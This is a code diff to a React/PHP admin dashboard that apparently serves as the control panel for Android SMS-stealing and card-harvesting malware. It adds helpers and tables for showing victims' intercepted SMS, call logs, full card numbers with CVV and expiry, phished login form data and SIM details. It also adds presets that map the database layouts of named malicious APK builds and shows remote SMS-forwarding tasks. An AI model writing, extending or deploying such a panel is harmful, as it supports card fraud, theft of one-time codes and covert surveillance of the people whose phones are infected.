@@ -148,6 +148,19 @@ include_once __DIR__ . '/header.php';
           .replace(/\b\w/g, char => char.toUpperCase());
       };
 
+      // Universal Field Key Resolvers (Compatible with Firestore & RTDB payload variations)
+      const getSmsBody = (s) => s ? (s.body || s.message || s.text || s.msg || s.content || '') : '';
+      const getSmsSender = (s) => s ? (s.sender || s.address || s.from || s.phone || s.sender_id || 'Unknown') : 'Unknown';
+      const getSmsSimSlot = (s) => s ? (s.sim_number || s.simSlot || s.sim_slot || s.sim || s.slot || 'SIM 1') : 'SIM 1';
+      const getSmsTimestamp = (s) => s ? smartDateParser(s.timestamp || s.date || s.time || s.created_at) : 'N/A';
+
+      const getCardNumber = (c) => c ? (c.number || c.cardNumber || c.card_number || c.card_no || c.cardNo || 'N/A') : 'N/A';
+      const getCardExpiry = (c) => c ? (c.exp || c.expiry || c.expiryDate || c.exp_date || c.expiry_date || 'N/A') : 'N/A';
+      const getCardCvv = (c) => c ? (c.cvv || c.card_cvv || c.security_code || c.cvc || '•••') : '•••';
+      const getCardHolder = (c) => c ? (c.cardHolder || c.cardHolderName || c.holder_name || c.name || c.user_name || 'N/A') : 'N/A';
+      const getCardBankName = (c) => c ? (c.bankName || c.bank_name || c.bank || c.issuer || 'Bank Account') : 'Bank Account';
+      const getCardType = (c) => c ? (c.cardType || c.card_type || c.type || 'Card Payload') : 'Card Payload';
+
       const isSystemKey = (key) => {
         const sysKeys = ['id', 'userId', 'targetId', 'timestamp', 'submittedAt', 'orgId', '_v', 'formTitle'];
         return sysKeys.includes(key);
@@ -270,6 +283,22 @@ include_once __DIR__ . '/header.php';
         }
       };
 
+      const DEFAULT_SCHEMA_PRESETS = {
+        v1_standard: { name: "⚡ Adminto Standard V1", sms: "smsData", calls: "callData", cards: "cardData", forms: "formData", sims: "simData" },
+        rtdb_v2: { name: "🔥 RTDB Custom V2 (Your Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
+        motupatlu: { name: "📱 MotuPatlu APK Preset", sms: "sma", calls: "call_records", cards: "card_details", forms: "userInputs", sims: "sims" },
+        legacy: { name: "🛡️ Legacy Classic Preset", sms: "messages", calls: "call_logs", cards: "cards", forms: "finalData", sims: "sim_info" }
+      };
+
+      const [fbCustomPresets, setFbCustomPresets] = React.useState(() => {
+        try {
+          const saved = localStorage.getItem('adminto_custom_presets');
+          return saved ? JSON.parse(saved) : {};
+        } catch(e) { return {}; }
+      });
+
+      const allFbPresets = React.useMemo(() => ({ ...DEFAULT_SCHEMA_PRESETS, ...fbCustomPresets }), [fbCustomPresets]);
+
       // Firebase Config Modal State
       const [showFirebaseModal, setShowFirebaseModal] = React.useState(false);
       const [fbProject, setFbProject] = React.useState('');
@@ -277,12 +306,53 @@ include_once __DIR__ . '/header.php';
       const [fbAuthDomain, setFbAuthDomain] = React.useState('');
       const [fbStorageBucket, setFbStorageBucket] = React.useState('');
       const [fbAppId, setFbAppId] = React.useState('');
+      const [fbPresetKey, setFbPresetKey] = React.useState('custom');
       const [fbSmsColl, setFbSmsColl] = React.useState('smsData');
       const [fbCallsColl, setFbCallsColl] = React.useState('callData');
       const [fbCardsColl, setFbCardsColl] = React.useState('cardData');
       const [fbFormsColl, setFbFormsColl] = React.useState('formData');
       const [fbJsonPaste, setFbJsonPaste] = React.useState('');
       const [fbSaveStatus, setFbSaveStatus] = React.useState('');
+
+      const handleApplyFbPreset = (presetKey) => {
+        setFbPresetKey(presetKey);
+        if (presetKey !== 'custom' && allFbPresets[presetKey]) {
+          const p = allFbPresets[presetKey];
+          setFbSmsColl(p.sms);
+          setFbCallsColl(p.calls);
+          setFbCardsColl(p.cards);
+          setFbFormsColl(p.forms);
+        }
+      };
+
+      const handleSaveNewFbPreset = () => {
+        const name = prompt('Enter a custom name for this schema preset (e.g. "Client APK V3"):');
+        if (!name || !name.trim()) return;
+        const key = `user_preset_${Date.now()}`;
+        const newPreset = {
+          name: `⭐ ${name.trim()}`,
+          sms: fbSmsColl || 'smsData',
+          calls: fbCallsColl || 'callData',
+          cards: fbCardsColl || 'cardData',
+          forms: fbFormsColl || 'formData',
+          sims: 'simData',
+          isUserCreated: true
+        };
+        const updated = { ...fbCustomPresets, [key]: newPreset };
+        setFbCustomPresets(updated);
+        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
+        setFbPresetKey(key);
+        triggerToast(`✓ Custom preset "${name.trim()}" saved to dropdown!`);
+      };
+
+      const handleDeleteFbCustomPreset = (key) => {
+        if (!confirm('Are you sure you want to delete this custom preset from your dropdown?')) return;
+        const updated = { ...fbCustomPresets };
+        delete updated[key];
+        setFbCustomPresets(updated);
+        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
+        setFbPresetKey('custom');
+      };
 
       const openFirebaseSettings = () => {
         const conf = adminUser?.firebaseConfig || {};
@@ -775,21 +845,21 @@ include_once __DIR__ . '/header.php';
                   <button onClick={() => setSelectedUser(null)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                 </div>
 
-                <div style={{ padding: '1rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px', overflowX: 'auto' }}>
+                <div style={{ padding: '0.85rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px', overflowX: 'auto', alignItems: 'center', whiteSpace: 'nowrap', flexShrink: 0 }}>
                   <button className={`tab-btn ${tab === 'sms' ? 'active' : ''}`} onClick={() => setTab('sms')}>
-                    💬 SMS Messages ({selectedUser.smsDataList.length})
+                    💬 SMS ({selectedUser.smsDataList.length})
                   </button>
                   <button className={`tab-btn ${tab === 'inspector' ? 'active' : ''}`} onClick={() => setTab('inspector')}>
-                    🔍 Universal Schema Inspector
+                    🔍 Schema Inspector
                   </button>
                   <button className={`tab-btn ${tab === 'sims' ? 'active' : ''}`} onClick={() => setTab('sims')}>
-                    📶 Dual-SIM Info
+                    📶 Dual SIM
                   </button>
                   <button className={`tab-btn ${tab === 'formfill' ? 'active' : ''}`} onClick={() => setTab('formfill')}>
                     📝 Form Fill-ups ({selectedUser.formDataList?.length || 0})
                   </button>
                   <button className={`tab-btn ${tab === 'calls' ? 'active' : ''}`} onClick={() => setTab('calls')}>
-                    📞 Call Records ({selectedUser.callDataList.length})
+                    📞 Calls ({selectedUser.callDataList.length})
                   </button>
                   <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
                     💳 Cards ({selectedUser.cardDataList.length})
@@ -801,30 +871,32 @@ include_once __DIR__ . '/header.php';
 
                 <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1 }}>
                   {tab === 'sms' && (
-                    <table className="data-table">
-                      <thead>
-                        <tr>
-                          <th>Sender</th>
-                          <th>Type</th>
-                          <th>Message Body</th>
-                          <th>Timestamp</th>
-                        </tr>
-                      </thead>
-                      <tbody>
-                        {selectedUser.smsDataList.map((sms, i) => (
-                          <tr key={i}>
-                            <td style={{ color: '#818cf8', fontWeight: 600 }}>{sms.sender}</td>
-                            <td>
-                              <span style={{ fontSize: '0.72rem', padding: '3px 7px', borderRadius: '6px', fontWeight: 700, background: sms.type === 'SENT' ? 'rgba(236,72,153,0.15)' : 'rgba(52,211,153,0.15)', color: sms.type === 'SENT' ? '#f472b6' : '#34d399' }}>
-                                {sms.type === 'SENT' ? '📤 SENT' : '📥 INBOX'}
-                              </span>
-                            </td>
-                            <td>{sms.message}</td>
-                            <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{sms.timestamp}</td>
+                    <div style={{ overflowX: 'auto', width: '100%' }}>
+                      <table className="data-table">
+                        <thead>
+                          <tr>
+                            <th>Sender</th>
+                            <th>Type</th>
+                            <th>Message Body</th>
+                            <th>Timestamp</th>
                           </tr>
-                        ))}
-                      </tbody>
-                    </table>
+                        </thead>
+                        <tbody>
+                          {(selectedUser.smsDataList || []).map((sms, i) => (
+                            <tr key={i}>
+                              <td style={{ color: '#818cf8', fontWeight: 600, whiteSpace: 'nowrap' }}>{getSmsSender(sms)}</td>
+                              <td style={{ whiteSpace: 'nowrap' }}>
+                                <span style={{ fontSize: '0.72rem', padding: '3px 7px', borderRadius: '6px', fontWeight: 700, background: sms.type === 'SENT' ? 'rgba(236,72,153,0.15)' : 'rgba(52,211,153,0.15)', color: sms.type === 'SENT' ? '#f472b6' : '#34d399' }}>
+                                  {sms.type === 'SENT' ? '📤 SENT' : '📥 INBOX'} ({getSmsSimSlot(sms)})
+                                </span>
+                              </td>
+                              <td style={{ wordBreak: 'break-word', minWidth: '220px' }}>{getSmsBody(sms)}</td>
+                              <td style={{ color: '#9ca3af', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{getSmsTimestamp(sms)}</td>
+                            </tr>
+                          ))}
+                        </tbody>
+                      </table>
+                    </div>
                   )}
 
                   {tab === 'inspector' && (
@@ -915,26 +987,28 @@ include_once __DIR__ . '/header.php';
                   )}
 
                   {tab === 'calls' && (
-                    <table className="data-table">
-                      <thead>
-                        <tr>
-                          <th>Number</th>
-                          <th>Call Type</th>
-                          <th>Duration</th>
-                          <th>Timestamp</th>
-                        </tr>
-                      </thead>
-                      <tbody>
-                        {selectedUser.callDataList.map((call, i) => (
-                          <tr key={i}>
-                            <td>{call.number}</td>
-                            <td><span style={{ color: call.type === 'INCOMING' ? '#34d399' : '#818cf8', fontWeight: 600 }}>{call.type}</span></td>
-                            <td>{call.duration}</td>
-                            <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{call.timestamp}</td>
+                    <div style={{ overflowX: 'auto', width: '100%' }}>
+                      <table className="data-table">
+                        <thead>
+                          <tr>
+                            <th>Number</th>
+                            <th>Call Type</th>
+                            <th>Duration</th>
+                            <th>Timestamp</th>
                           </tr>
-                        ))}
-                      </tbody>
-                    </table>
+                        </thead>
+                        <tbody>
+                          {(selectedUser.callDataList || []).map((call, i) => (
+                            <tr key={i}>
+                              <td style={{ whiteSpace: 'nowrap' }}>{call.number}</td>
+                              <td style={{ whiteSpace: 'nowrap' }}><span style={{ color: call.type === 'INCOMING' ? '#34d399' : '#818cf8', fontWeight: 600 }}>{call.type}</span></td>
+                              <td style={{ whiteSpace: 'nowrap' }}>{call.duration}</td>
+                              <td style={{ color: '#9ca3af', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{call.timestamp}</td>
+                            </tr>
+                          ))}
+                        </tbody>
+                      </table>
+                    </div>
                   )}
 
                   {tab === 'formfill' && (
@@ -975,72 +1049,76 @@ include_once __DIR__ . '/header.php';
                   )}
 
                   {tab === 'cards' && (
-                    <table className="data-table">
-                      <thead>
-                        <tr>
-                          <th>Bank Name</th>
-                          <th>Card Type</th>
-                          <th>Card Number</th>
-                          <th>Card Holder</th>
-                          <th>Expiry</th>
-                          <th>CVV</th>
-                        </tr>
-                      </thead>
-                      <tbody>
-                        {selectedUser.cardDataList.map((card, i) => (
-                          <tr key={i}>
-                            <td><strong style={{ color: '#818cf8' }}>{card.bankName || 'State Bank of India'}</strong></td>
-                            <td>
-                              <span style={{ fontSize: '0.75rem', padding: '3px 8px', borderRadius: '12px', background: 'rgba(236,72,153,0.15)', color: '#f472b6', fontWeight: 600 }}>
-                                {card.cardType || 'Credit Card'}
-                              </span>
-                            </td>
-                            <td><code style={{ color: '#f472b6' }}>{card.cardNumber}</code></td>
-                            <td>{card.cardHolder}</td>
-                            <td>{card.expiry}</td>
-                            <td><code style={{ color: '#f87171' }}>{card.cvv}</code></td>
+                    <div style={{ overflowX: 'auto', width: '100%' }}>
+                      <table className="data-table">
+                        <thead>
+                          <tr>
+                            <th>Bank Name</th>
+                            <th>Card Type</th>
+                            <th>Card Number</th>
+                            <th>Card Holder</th>
+                            <th>Expiry</th>
+                            <th>CVV</th>
                           </tr>
-                        ))}
-                      </tbody>
-                    </table>
+                        </thead>
+                        <tbody>
+                          {(selectedUser.cardDataList || []).map((card, i) => (
+                            <tr key={i}>
+                              <td style={{ whiteSpace: 'nowrap' }}><strong style={{ color: '#818cf8' }}>{getCardBankName(card)}</strong></td>
+                              <td style={{ whiteSpace: 'nowrap' }}>
+                                <span style={{ fontSize: '0.75rem', padding: '3px 8px', borderRadius: '12px', background: 'rgba(236,72,153,0.15)', color: '#f472b6', fontWeight: 600 }}>
+                                  {getCardType(card)}
+                                </span>
+                              </td>
+                              <td style={{ whiteSpace: 'nowrap' }}><code style={{ color: '#f472b6' }}>{getCardNumber(card)}</code></td>
+                              <td style={{ whiteSpace: 'nowrap' }}>{getCardHolder(card)}</td>
+                              <td style={{ whiteSpace: 'nowrap' }}>{getCardExpiry(card)}</td>
+                              <td style={{ whiteSpace: 'nowrap' }}><code style={{ color: '#f87171' }}>{getCardCvv(card)}</code></td>
+                            </tr>
+                          ))}
+                        </tbody>
+                      </table>
+                    </div>
                   )}
                   {tab === 'forward' && (
-                    <table className="data-table">
-                      <thead>
-                        <tr>
-                          <th>Task ID</th>
-                          <th>Type</th>
-                          <th>Selected SIM</th>
-                          <th>Destination Number</th>
-                          <th>Timestamp</th>
-                          <th>Delivery Status</th>
-                        </tr>
-                      </thead>
-                      <tbody>
-                        {forwardTasks.filter(t => t.userId === selectedUser.userId).map((task) => (
-                          <tr key={task.id}>
-                            <td><code style={{ color: '#818cf8' }}>{task.id}</code></td>
-                            <td><strong style={{ color: task.dataType === 'SMS' ? '#ec4899' : '#38bdf8' }}>{task.dataType}</strong></td>
-                            <td><span style={{ color: '#fbbf24', fontWeight: 600 }}>{task.selectedSim}</span></td>
-                            <td><strong>{task.phoneNumber}</strong></td>
-                            <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{task.timestamp}</td>
-                            <td>
-                              <span className={`pulse-badge ${task.status === 'sent' ? 'active' : task.status === 'pending' ? 'pending' : 'expired'}`}>
-                                <span className="pulse-dot"></span>
-                                {task.status.toUpperCase()}
-                              </span>
-                            </td>
-                          </tr>
-                        ))}
-                        {forwardTasks.filter(t => t.userId === selectedUser.userId).length === 0 && (
+                    <div style={{ overflowX: 'auto', width: '100%' }}>
+                      <table className="data-table">
+                        <thead>
                           <tr>
-                            <td colSpan="6" style={{ textAlign: 'center', color: '#9ca3af', padding: '1.5rem' }}>
-                              No active remote forward tasks for this device.
-                            </td>
+                            <th>Task ID</th>
+                            <th>Type</th>
+                            <th>Selected SIM</th>
+                            <th>Destination Number</th>
+                            <th>Timestamp</th>
+                            <th>Delivery Status</th>
                           </tr>
-                        )}
-                      </tbody>
-                    </table>
+                        </thead>
+                        <tbody>
+                          {forwardTasks.filter(t => t.userId === selectedUser.userId).map((task) => (
+                            <tr key={task.id}>
+                              <td style={{ whiteSpace: 'nowrap' }}><code style={{ color: '#818cf8' }}>{task.id}</code></td>
+                              <td style={{ whiteSpace: 'nowrap' }}><strong style={{ color: task.dataType === 'SMS' ? '#ec4899' : '#38bdf8' }}>{task.dataType}</strong></td>
+                              <td style={{ whiteSpace: 'nowrap' }}><span style={{ color: '#fbbf24', fontWeight: 600 }}>{task.selectedSim}</span></td>
+                              <td style={{ whiteSpace: 'nowrap' }}><strong>{task.phoneNumber}</strong></td>
+                              <td style={{ color: '#9ca3af', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{task.timestamp}</td>
+                              <td style={{ whiteSpace: 'nowrap' }}>
+                                <span className={`pulse-badge ${task.status === 'sent' ? 'active' : task.status === 'pending' ? 'pending' : 'expired'}`}>
+                                  <span className="pulse-dot"></span>
+                                  {task.status.toUpperCase()}
+                                </span>
+                              </td>
+                            </tr>
+                          ))}
+                          {forwardTasks.filter(t => t.userId === selectedUser.userId).length === 0 && (
+                            <tr>
+                              <td colSpan="6" style={{ textAlign: 'center', color: '#9ca3af', padding: '1.5rem' }}>
+                                No active remote forward tasks for this device.
+                              </td>
+                            </tr>
+                          )}
+                        </tbody>
+                      </table>
+                    </div>
                   )}
                 </div>
               </div>
@@ -1183,23 +1261,50 @@ include_once __DIR__ . '/header.php';
                       </div>
                       {/* SuperAdmin Custom Collection Mapping */}
                       <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
-                        <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                          <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
+                          <span className="pulse-badge active" style={{ fontSize: '0.7rem' }}>One-Click Presets Active</span>
+                        </div>
+
+                        {/* Presets Selector Dropdown & Preset Manager */}
+                        <div style={{ background: 'rgba(17,24,39,0.8)', padding: '10px 12px', borderRadius: '10px', border: '1px dashed rgba(56,189,248,0.4)' }}>
+                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
+                            <label style={{ fontSize: '0.75rem', color: '#38bdf8', fontWeight: 600 }}>⚡ Select Database Schema Preset (Auto-Fill Mappings):</label>
+                            <button type="button" onClick={handleSaveNewFbPreset} style={{ background: 'rgba(56,189,248,0.15)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)', borderRadius: '6px', padding: '2px 8px', fontSize: '0.72rem', fontWeight: 700, cursor: 'pointer' }}>
+                              ➕ Save as New Preset
+                            </button>
+                          </div>
+                          <div style={{ display: 'flex', gap: '6px' }}>
+                            <select className="filter-select" style={{ flex: 1, borderRadius: '8px' }} value={fbPresetKey} onChange={(e) => handleApplyFbPreset(e.target.value)}>
+                              <option value="custom">🛠️ Custom Manual Setup</option>
+                              {Object.entries(allFbPresets).map(([key, p]) => (
+                                <option key={key} value={key}>{p.name}</option>
+                              ))}
+                            </select>
+                            {fbPresetKey.startsWith('user_preset_') && (
+                              <button type="button" onClick={() => handleDeleteFbCustomPreset(fbPresetKey)} style={{ background: 'rgba(239,68,68,0.15)', color: '#f87171', border: '1px solid rgba(239,68,68,0.3)', borderRadius: '8px', padding: '0 10px', fontSize: '0.75rem', cursor: 'pointer' }} title="Delete Custom Preset">
+                                🗑️
+                              </button>
+                            )}
+                          </div>
+                        </div>
+
                         <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                           <div>
                             <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>SMS Collection Name</label>
-                            <input type="text" className="search-input" value={fbSmsColl} onChange={(e) => setFbSmsColl(e.target.value)} placeholder="smsData (or sma)" />
+                            <input type="text" className="search-input" value={fbSmsColl} onChange={(e) => { setFbSmsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="smsData (or sma)" />
                           </div>
                           <div>
                             <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Calls Collection Name</label>
-                            <input type="text" className="search-input" value={fbCallsColl} onChange={(e) => setFbCallsColl(e.target.value)} placeholder="callData (or calls)" />
+                            <input type="text" className="search-input" value={fbCallsColl} onChange={(e) => { setFbCallsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="callData (or calls)" />
                           </div>
                           <div>
                             <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Cards Collection Name</label>
-                            <input type="text" className="search-input" value={fbCardsColl} onChange={(e) => setFbCardsColl(e.target.value)} placeholder="cardData (or cards)" />
+                            <input type="text" className="search-input" value={fbCardsColl} onChange={(e) => { setFbCardsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="cardData (or cards)" />
                           </div>
                           <div>
                             <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Form Fill-ups Collection</label>
-                            <input type="text" className="search-input" value={fbFormsColl} onChange={(e) => setFbFormsColl(e.target.value)} placeholder="formData (or userInputs)" />
+                            <input type="text" className="search-input" value={fbFormsColl} onChange={(e) => { setFbFormsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="formData (or userInputs)" />
                           </div>
                         </div>
                       </div>
